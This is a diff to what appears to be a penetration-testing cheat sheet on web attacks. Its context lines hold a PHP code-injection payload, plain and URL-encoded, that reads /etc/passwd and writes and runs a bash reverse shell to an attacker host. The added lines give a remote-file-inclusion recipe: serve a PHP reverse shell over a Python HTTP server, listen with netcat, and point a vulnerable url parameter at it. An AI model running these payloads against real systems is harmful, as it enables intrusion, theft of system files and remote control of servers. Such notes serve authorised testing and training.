@@ -37,3 +37,25 @@ page=' and die(system('cat /etc/passwd')) or '
 # page=' and die(system('echo \'/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1\' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh')) or '
 page=' and die(system('echo '%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F<attacker ip>%2F<attacker port> 0>%261' > %2Ftmp%2Frevshell.sh %26%26 chmod 777 %2Ftmp%2Frevshell.sh %26%26 %2Fbin%2Fbash %2Ftmp%2Frevshell.sh')) or '%0A
 ```
+
+RFI
+
+- method1 
+
+    attacker
+
+    ```shell
+    # modify attcker ip and port, e.g., 192.168.10.100 4444
+    locate php-reverse-shell
+    # start http server
+    sudo python3 -m http.server 80
+    # listen on port 4444
+    sudo nc -nlvp 4444
+    ```
+
+    target
+
+    ```shell
+    # vulnerability page
+    /test.php?url=http://<attcker ip>:<attacker port>/php-reverse-shell.php
+    ```
